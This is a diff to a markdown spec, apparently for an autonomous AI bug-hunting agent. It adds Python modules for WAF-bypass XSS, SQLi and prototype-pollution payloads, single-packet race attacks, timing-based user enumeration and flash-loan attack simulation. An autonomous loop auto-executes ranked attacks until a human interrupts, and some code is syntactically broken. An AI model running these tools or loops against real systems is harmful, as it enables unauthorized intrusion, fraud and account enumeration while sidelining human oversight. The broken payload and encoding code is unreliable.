+                if src in line and ("=" in line or "const" in line or "let" in line or "var" in line):
+                    var_name = self._extract_js_variable(line)
+                    for j in range(i, min(i+20, len(lines))):
+                        for sink_type, patterns in self.SINKS.items():
+                            for pattern in patterns:
+                                if pattern in lines[j] and var_name in lines[j]:
+                                    sanitized = any(s in " ".join(lines[i:j]) for s in self.SANITIZERS)
+                                    if not sanitized:
+                                        self.findings.append({
+                                            "file": file_path,
+                                            "line": j,
+                                            "source": src,
+                                            "sink_type": sink_type,
+                                            "severity": self._severity_for_sink(sink_type),
+                                            "type": f"TAINT_{sink_type}",
+                                            "code_snippet": lines[j].strip()
+                                        })
+
+    def _extract_js_variable(self, line: str) -> str:
+        match = re.search(r"(?:const|let|var)\s+(\w+)", line)
+        if match:
+            return match.group(1)
+        match = re.search(r"(\w+)\s*=", line)
+        if match:
+            return match.group(1)
+        return "unknown"
+
+    def _severity_for_sink(self, sink_type: str) -> str:
+        severity_map = {
+            "RCE": "CRITICAL", "SQLI": "CRITICAL", "SSRF": "HIGH",
+            "SSTI": "HIGH", "XSS": "MEDIUM", "PATH_TRAVERSAL": "HIGH",
+            "MASS_ASSIGNMENT": "HIGH"
+        }
+        return severity_map.get(sink_type, "MEDIUM")
+
+    def scan_codebase(self) -> List[Dict]:
+        for root, _, files in os.walk(self.codebase):
+            for file in files:
+                if file.endswith((".py", ".js", ".ts")):
+                    self.analyze_file(os.path.join(root, file))
+        return self.findings
+
+# USAGE:
+# tracker = SemanticTaintTracker("/path/to/target/app")
+# findings = tracker.scan_codebase()
+
+```
+
+**Trigger:** `--semantic-taint` or source code available.
+
+---
+
+## Module 6: Economic Fuzzer (`economic_fuzzer.py`)
+
+**Purpose:** Simulates transaction ordering, flash loans, and oracle manipulation to find MEV-extractable vulnerabilities.
+
+**Hidden bugs caught:** Flash loan sandwich attacks, oracle manipulation with price delay, reentrancy across tokens, governance front-running.
+
+```python
+# economic_fuzzer.py
+from dataclasses import dataclass
+from typing import List, Dict, Callable
+import random
+
+@dataclass
+class ContractState:
+    balances: Dict[str, int]
+    total_supply: int
+    price_oracle: float
+    locked: bool = False
+
+class EconomicFuzzer:
+    """Simulates economic attacks against smart contracts."""
+
+    def __init__(self):
+        self.attacks = []
+
+    def simulate_flash_loan_attack(self, state: ContractState,
+                                   borrow_amount: int,
+                                   contract_logic: Callable) -> Dict:
+        initial_balance = state.balances.get("attacker", 0)
+        state.balances["attacker"] = state.balances.get("attacker", 0) + borrow_amount
+        state.balances["flash_pool"] = state.balances.get("flash_pool", 0) - borrow_amount
+        original_price = state.price_oracle
+        state.price_oracle *= (1 + (borrow_amount / state.total_supply))
+        profit = contract_logic(state)
+        fee = borrow_amount * 0.0009
+        state.balances["attacker"] -= (borrow_amount + fee)
+        state.balances["flash_pool"] += (borrow_amount + fee)
+        state.price_oracle = original_price
+        net_profit = state.balances["attacker"] - initial_balance
+        return {
+            "attack_type": "FLASH_LOAN_MANIPULATION",
+            "borrow_amount": borrow_amount,
+            "net_profit": net_profit,
+            "viable": net_profit > 0,
+            "severity": "CRITICAL" if net_profit > 10000 else "HIGH",
+            "steps": [
+                f"Flash borrow {borrow_amount}",
+                f"Manipulate oracle: {original_price} -> {state.price_oracle}",
+                f"Extract profit: {profit}",
+                f"Repay {borrow_amount + fee}",
+                f"Net profit: {net_profit}"
+            ]
+        }
+
+    def simulate_sandwich_attack(self, state: ContractState,
+                                 victim_tx: Dict,
+                                 attacker_reserve: int) -> Dict:
+        victim_amount = victim_tx["amount"]
+        victim_direction = victim_tx["direction"]
+        front_amount = victim_amount * 0.1
+        state.price_oracle *= (1 + front_amount / state.total_supply)
+        victim_price = state.price_oracle
+        victim_received = victim_amount / victim_price
+        state.price_oracle *= (1 - front_amount / state.total_supply)
+        back_profit = front_amount * (victim_price - state.price_oracle)
+        return {
+            "attack_type": "SANDWICH_ATTACK",
+            "front_run_amount": front_amount,
+            "victim_slippage": (victim_price - state.price_oracle) / state.price_oracle,
+            "attacker_profit": back_profit,
+            "viable": back_profit > 0,
+            "severity": "HIGH"
+        }
+
+    def find_profitable_attacks(self, state: ContractState,
+                               contract_logic: Callable,
+                               iterations: int = 100) -> List[Dict]:
+        results = []
+        for i in range(iterations):
+            borrow = random.randint(1000, 1000000)
+            result = self.simulate_flash_loan_attack(state, borrow, contract_logic)
+            if result["viable"]:
+                results.append(result)
+        return sorted(results, key=lambda x: x["net_profit"], reverse=True)[:5]
+
+# USAGE:
+# state = ContractState(balances={"pool": 1000000, "attacker": 100}, total_supply=1000000, price_oracle=1.0)
+# fuzzer = EconomicFuzzer()
+# attacks = fuzzer.find_profitable_attacks(state, lambda s: s.balances["attacker"] * 0.1)
+
+```
+
+**Trigger:** `--economic-fuzz` or DeFi/smart contract target.
+
+---
+
+## Module 7: Zero-Context Payload Mutator (`zero_context_mutator.py`)
+
+**Purpose:** Uses semantic analysis to generate novel payloads that bypass semantic WAFs and input validation that pattern-matching tools miss.
+
+**Hidden bugs caught:** Novel WAF bypasses, context-specific XSS, JSON pollution, prototype pollution via unusual paths.
+
+```python
+# zero_context_mutator.py
+import random
+import string
+import base64
+import urllib.parse
+import html
+
+class ZeroContextMutator:
+    """Generates context-aware payload mutations that bypass modern validation."""
+
+    ENCODINGS = {
+        "url": urllib.parse.quote,
+        "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
+        "base64": base64.b64encode,
+        "html_entity": lambda x: "".join(f"&#{ord(c)};" for c in x),
+        "hex": lambda x: "".join(f"\x{ord(c):02x}" for c in x),
+        "unicode": lambda x: "".join(f"\u{ord(c):04x}" for c in x),
+        "mixed": lambda x: "".join(random.choice([
+            f"%{ord(c):02x}", f"&#{ord(c)};", c
+        ]) for c in x)
+    }
+
+    def __init__(self):
+        self.waf_signatures = set()
+
+    def generate_novel_xss(self, context: str = "html") -> List[str]:
+        payloads = []
+        if context == "html":
+            bases = [
+                "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>",
+                ""><script>alert(1)</script>",
+                "javascript:alert(1)"
+            ]
+            for base in bases:
+                payloads.append(self._random_case(base))
+                payloads.append(self._insert_comments(base))
+                payloads.append(self._encode_attributes(base))
+                payloads.append(self._homoglyph_replace(base))
+                payloads.append(self.ENCODINGS["double_url"](base))
+        elif context == "js_string":
+            bases = [
+                "'-alert(1)-'",
+                "';alert(1);//",
+                "${alert(1)}",
+                "';alert(1);'"
+            ]
+            for base in bases:
+                payloads.append(self._template_literal_bypass(base))
+                payloads.append(self._line_continuation_bypass(base))
+        return list(set(payloads))
+
+    def generate_json_pollution(self, target_proto: str = "Object") -> List[Dict]:
+        return [
+            {"__proto__": {"isAdmin": True}},
+            {"constructor": {"prototype": {"isAdmin": True}}},
+            {"__proto__.isAdmin": True},
+            {"__proto__[isAdmin]": True},
+            {"__proto__": {"toString": "admin"}},
+            {"a": {"__proto__": {"polluted": True}}}
+        ]
+
+    def generate_waf_evasion_sqli(self, db_type: str = "mysql") -> List[str]:
+        techniques = []
+        techniques.append("SE/**/LECT * FROM users")
+        techniques.append("SEL%00ECT * FROM users")
+        techniques.append("/*!50000SELECT*/ * FROM users")
+        techniques.append("SeL%cT * FrOm users")
+        techniques.append("1 AND 1=1")
+        techniques.append("1 && 1")
+        techniques.append("1 OR 1=1")
+        techniques.append("1 || 1")
+        if db_type == "mysql":
+            techniques.append("1 INTO OUTFILE '/tmp/test'")
+            techniques.append("LOAD_FILE('/etc/passwd')")
+        return techniques
+
+    def _random_case(self, s: str) -> str:
+        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
+
+    def _insert_comments(self, s: str) -> str:
+        return s.replace(" ", "<!---->").replace("=", "<!---->=<!---->")
+
+    def _encode_attributes(self, s: str) -> str:
+        if "=" in s:
+            parts = s.split("=", 1)
+            return f"{parts[0]}={urllib.parse.quote(parts[1])}"
+        return s
+
+    def _homoglyph_replace(self, s: str) -> str:
+        homoglyphs = {
+            "a": "а", "e": "е", "o": "о", "p": "р", "c": "с",
+        }
+        result = ""
+        for c in s:
+            result += homoglyphs.get(c, c)
+        return result
+
+    def _template_literal_bypass(self, s: str) -> str:
+        if "'" in s:
+            return s.replace("'", "`")
+        return s
+
+    def _line_continuation_bypass(self, s: str) -> str:
+        return s.replace(" ", "\\\n")
+
+# USAGE:
+# mutator = ZeroContextMutator()
+# xss_payloads = mutator.generate_novel_xss("js_string")
+# pollution = mutator.generate_json_pollution()
+
+```
+
+**Trigger:** `--zero-context` or WAF-protected targets.
+
+---
+
+## Module 8: Ghost State Hunter (`ghost_state_hunter.py`)
+
+**Purpose:** Uses single-packet attacks and statistical timing analysis to find race conditions that normal sequential testing misses.
+
+**Hidden bugs caught:** Double-spend, coupon reuse, inventory overselling, TOCTOU in file operations, user enumeration via timing.
+
+```python
+# ghost_state_hunter.py
+import requests
+import threading
+import time
+import statistics
+from typing import List, Dict
+import socket
+import ssl
+
+class GhostStateHunter:
+    """Advanced race condition detection using parallel request bursts."""
+
+    def __init__(self, base_url: str):
+        self.base_url = base_url
+        self.results = []
+
+    def single_packet_attack(self, endpoint: str, payload: dict,
+                            count: int = 20,
+                            token: str = None) -> Dict:
+        headers = {"Authorization": f"Bearer {token}"} if token else {}
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+        body = "&".join([f"{k}={v}" for k, v in payload.items()])
+        request_lines = []
+        for i in range(count):
+            req = (
+                f"POST {endpoint} HTTP/1.1\r\n"
+                f"Host: {self.base_url.replace('https://', '').replace('http://', '')}\r\n"
+                f"Content-Length: {len(body)}\r\n"
+                f"{'Authorization: Bearer ' + token + '\r\n' if token else ''}"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Connection: keep-alive\r\n"
+                f"\r\n"
+                f"{body}"
+            )
+            request_lines.append(req)
+
+        host = self.base_url.replace("https://", "").replace("http://", "")
+        port = 443 if "https" in self.base_url else 80
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if port == 443:
+                context = ssl.create_default_context()
+                sock = context.wrap_socket(sock, server_hostname=host)
+            sock.connect((host, port))
+            sock.sendall("\r\n".join(request_lines).encode())
+            responses = []
+            sock.settimeout(10)
+            while True:
+                try:
+                    data = sock.recv(4096)
+                    if not data:
+                        break
+                    responses.append(data.decode("utf-8", errors="ignore"))
+                except socket.timeout:
+                    break
+            sock.close()
+            success_count = sum(1 for r in responses if "200" in r or "201" in r)
+            return {
+                "attack_type": "SINGLE_PACKET_RACE",
+                "endpoint": endpoint,
+                "requests_sent": count,
+                "success_responses": success_count,
+                "viable": success_count > 1,
+                "severity": "CRITICAL" if success_count > 2 else "HIGH",
+                "evidence": f"{success_count}/{count} requests succeeded simultaneously"
+            }
+        except Exception as e:
+            return {"error": str(e)}
+
+    def statistical_timing_attack(self, endpoint: str,
+                                  payloads: List[dict],
+                                  token: str = None,
+                                  iterations: int = 50) -> Dict:
+        times_valid = []
+        times_invalid = []
+        for i in range(iterations):
+            start = time.time()
+            requests.post(f"{self.base_url}{endpoint}",
+                         json=payloads[0],
+                         headers={"Authorization": f"Bearer {token}"} if token else {},
+                         timeout=10)
+            times_valid.append((time.time() - start) * 1000)
+
+            start = time.time()
+            requests.post(f"{self.base_url}{endpoint}",
+                         json=payloads[1],
+                         headers={"Authorization": f"Bearer {token}"} if token else {},
+                         timeout=10)
+            times_invalid.append((time.time() - start) * 1000)
+
+        mean_valid = statistics.mean(times_valid)
+        mean_invalid = statistics.mean(times_invalid)
+        std_valid = statistics.stdev(times_valid) if len(times_valid) > 1 else 0
+        std_invalid = statistics.stdev(times_invalid) if len(times_invalid) > 1 else 0
+
+        if std_valid + std_invalid > 0:
+            t_stat = (mean_valid - mean_invalid) / ((std_valid**2/len(times_valid) + std_invalid**2/len(times_invalid))**0.5)
+        else:
+            t_stat = 0
+
+        significant = abs(t_stat) > 2.5 and abs(mean_valid - mean_invalid) > 5
+        return {
+            "attack_type": "TIMING_SIDE_CHANNEL",
+            "endpoint": endpoint,
+            "mean_valid_ms": mean_valid,
+            "mean_invalid_ms": mean_invalid,
+            "t_statistic": t_stat,
+            "significant": significant,
+            "severity": "MEDIUM" if significant else "INFO",
+            "evidence": f"Timing difference: {abs(mean_valid - mean_invalid):.1f}ms (t={t_stat:.2f})"
+        }
+
+# USAGE:
+# hunter = GhostStateHunter("https://target.com")
+# race = hunter.single_packet_attack("/api/coupon/redeem", {"code": "PROMO2025"}, count=10, token="user_token")
+# timing = hunter.statistical_timing_attack("/api/login", payloads=[{"email": "valid@user.com", "password": "wrong"}, {"email": "nonexistent@user.com", "password": "wrong"}], token=None)
+
+```
+
+**Trigger:** `--ghost-state` or financial ops, coupons, inventory targets.
+
+---
+
+## Module 9: The Feedback Oracle (Meta-Learning Engine)
+
+**Purpose:** Closed-loop learning system that updates global knowledge after every test, success or failure.
+
+```python
+# feedback_oracle.py
+from typing import Dict, List
+import time
+
+class FeedbackOracle:
+    """Closed-loop learning: every outcome updates the global knowledge base."""
+
+    def __init__(self, knowledge_base_path: str = "references/knowledge.md"):
+        self.kb_path = knowledge_base_path
+        self.target_profiles = {}
+        self.success_patterns = []
+        self.anti_patterns = []
+
+    def learn_from_failure(self, target: str, technique: str, reason: str):
+        """
+        Example: SQLi time-based failed because WAF blocks SLEEP()
+        -> Add "SLEEP() blocked" to target profile
+        -> Next time, try BENCHMARK() or pg_sleep() or conditional errors
+        """
+        if target not in self.target_profiles:
+            self.target_profiles[target] = {"blocked_techniques": [], "successful_techniques": []}
+        self.target_profiles[target]["blocked_techniques"].append({
+            "technique": technique,
+            "reason": reason,
+            "alternative": self._suggest_alternative(technique, reason)
+        })
+        self.anti_patterns.append({
+            "target": target,
+            "technique": technique,
+            "blocker": reason,
+            "timestamp": time.time()
+        })
+        print(f"[LEARN] {target}: {technique} failed due to {reason}. Alternative: {self._suggest_alternative(technique, reason)}")
+
+    def learn_from_success(self, target: str, technique: str, chain: List[Dict]):
+        """
+        Example: IDOR found on /api/v2/invoices
+        -> Immediately test /api/v2/orders, /api/v2/payments with same pattern
+        -> Add to A->B chain database
+        """
+        self.success_patterns.append({
+            "target": target,
+            "technique": technique,
+            "chain": chain,
+            "timestamp": time.time()
+        })
+        siblings = self._find_sibling_endpoints(target, chain[0]["endpoint"] if chain else "")
+        print(f"[LEARN] Success on {target} with {technique}. Sibling endpoints to test: {siblings}")
+        return siblings
+
+    def cross_target_transfer(self, source_target: str, bug: Dict, new_targets: List[str]):
+        """
+        Example: Found email confirmation bypass on Shopify
+        -> Auto-generate identical tests for Stripe, Square, BigCommerce
+        """
+        if bug.get("type") == "EMAIL_CONFIRMATION_BYPASS":
+            for platform in new_targets:
+                test_plan = {
+                    "target": platform,
+                    "test_type": "EMAIL_CONFIRMATION_BYPASS",
+                    "steps": [
+                        "Create account with email A",
+                        "Change email to email B",
+                        "Verify confirmation link goes to A instead of B",
+                        "Check SSO account linking by email"
+                    ],
+                    "confidence": "HIGH",
+                    "reason": f"Same anti-pattern as {source_target} — e-commerce platforms often share auth logic patterns"
+                }
+                print(f"[TRANSFER] Generated test plan for {platform} from {source_target} pattern")
+                yield test_plan
+
+    def _suggest_alternative(self, technique: str, reason: str) -> str:
+        alternatives = {
+            "SLEEP() blocked": "Try BENCHMARK(), pg_sleep(), conditional errors, or stacked queries",
+            "UNION blocked": "Try boolean-based blind, time-based, or error-based extraction",
+            "script tag blocked": "Try event handlers, SVG, JS context breakout, or template literals",
+            "single quote blocked": "Try numeric payloads, JSON encoding, or comment injection",
+        }
+        for key, alt in alternatives.items():
+            if key.lower() in reason.lower():
+                return alt
+        return "Try context-specific encoding or alternative syntax"
+
+    def _find_sibling_endpoints(self, target: str, endpoint: str) -> List[str]:
+        if "/invoices" in endpoint:
+            return [endpoint.replace("invoices", "orders"), endpoint.replace("invoices", "payments")]
+        elif "/users" in endpoint:
+            return [endpoint.replace("users", "accounts"), endpoint.replace("users", "profiles")]
+        return []
+
+# USAGE:
+# oracle = FeedbackOracle()
+# oracle.learn_from_failure("target.com", "time-based SQLi", "WAF blocks SLEEP()")
+# siblings = oracle.learn_from_success("target.com", "IDOR", [{"endpoint": "/api/invoices/123"}])
+# tests = list(oracle.cross_target_transfer("shopify", {"type": "EMAIL_CONFIRMATION_BYPASS"}, ["stripe", "square"]))
+
+```
+
+**Integration:** The Feedback Oracle runs silently after every agent execution. It never blocks — it only enriches future hypotheses.
+
+---
+
+## S-Class Orchestration Addendum
+
+### Updated Agent Selection (Turn 3)
+
+When spawning agents in Turn 3, also spawn these based on triggers:
+
+```yaml
+additional_agents:
+  shadow-logic-agent:
+    trigger: "target has user flows, payment logic, or multi-step workflows"
+    command: "python3 tools/shadow_logic.py --target {target} --tokens {auth_tokens}"
+
+  patch-gap-agent:
+    trigger: "target has public GitHub repo with security-labeled commits"
+    command: "python3 tools/patch_gap.py --repo {target_repo} --patch-source hacktivity"
+
+  second-order-agent:
+    trigger: "target has user-generated content, file uploads, or async processing"
+    command: "python3 tools/second_order_detector.py --target {target} --token {token} --admin-token {admin_token}"
+
+  weirdness-agent:
+    trigger: "always (API targets)"
+    command: "python3 tools/weirdness_scorer.py --target {target} --endpoints {endpoints} --token {token}"
+
+  semantic-taint-agent:
+    trigger: "source code is available"
+    command: "python3 tools/semantic_taint.py --codebase {repo_path}"
+
+  ghost-state-agent:
+    trigger: "target has coupons, payments, inventory, voting, or withdrawal flows"
+    command: "python3 tools/ghost_state_hunter.py --target {target} --endpoint {suspect_endpoint} --token {token}"
+
+  zero-context-agent:
+    trigger: "WAF blocks standard payloads or target uses Cloudflare/Akamai"
+    command: "python3 tools/zero_context_mutator.py --context {injection_context} --waf-type {detected_waf}"
+
+  economic-fuzzer-agent:
+    trigger: "DeFi protocol, smart contract with pricing/oracle logic"
+    command: "python3 tools/economic_fuzzer.py --contract {contract_address} --rpc {rpc_url}"
+```
+
+### Turn 5 — Autonomous Loop (New)
+
+After Turn 4, if `--autonomous` flag is set:
+
+```
+1. FEEDBACK ORACLE ingests all findings from Turn 4
+2. For each finding:
+   a. If success -> spawn sibling tests (same pattern on related endpoints)
+   b. If failure -> update target profile with blocker + alternative techniques
+   c. If duplicate -> improve dedup rules for next session
+3. HYPOTHESIS GENERATOR creates new attack hypotheses from:
+   - Anomalies detected by weirdness-agent
+   - Taint flows found by semantic-taint-agent  
+   - Patch gaps found by patch-gap-agent
+   - Second-order flows mapped by second-order-agent
+4. EV CALCULATOR ranks hypotheses by (probability x impact) / effort
+5. TOP HYPOTHESIS is auto-executed by the appropriate agent
+6. LOOP continues until: max iterations reached, or no high-EV hypotheses remain, or human interrupts
+```
+
+### New Mode Flags
+
+| Flag | Trigger | Action |
+|------|---------|--------|
+| `--shadow-logic` | Any web target | Enable behavioral baseline + anomaly detection |
+| `--patch-gap` | Public repo available | Ingest recent security commits, hunt variants |
+| `--second-order` | UGC / async target | Map storage->consumption flows |
+| `--weirdness` | API target | Build endpoint baseline, find statistical outliers |
+| `--semantic-taint` | Source code available | Run static source->sink analysis |
+| `--ghost-state` | Financial/logic flows | Single-packet race + timing analysis |
+| `--zero-context` | WAF present | Generate novel bypass payloads |
+| `--economic-fuzz` | DeFi/smart contract | Simulate flash loans, sandwich attacks |
+| `--autonomous` | Any full audit | Enable Turn 5 feedback loop |
+| `--all-modules` | "full audit" or no specific mode | Enable ALL S-Class modules |
+
+---
+
+## S-Class Safe Patterns (Do Not Flag — Additions)
+
+**Behavioral anomalies:** Timing differences caused by CDN caching, rate limiting responses with consistent timing, expected 404s on non-existent resources.
+
+**Second-order flows:** Data stored and later rendered with proper escaping in ALL consumption paths.
+
+**Patch-gap analysis:** Code that contains the anti-pattern but is in a test file, mock, or intentionally vulnerable training environment.
+
+**Economic fuzzing:** Negative simulated profit on all iterations with no viable attack path.
+
+**Semantic taint:** Source reaches sink but passes through a custom sanitizer not in the default SANITIZERS list (verify sanitizer logic manually before dismissing).
+
 
 ## RESOURCES
 
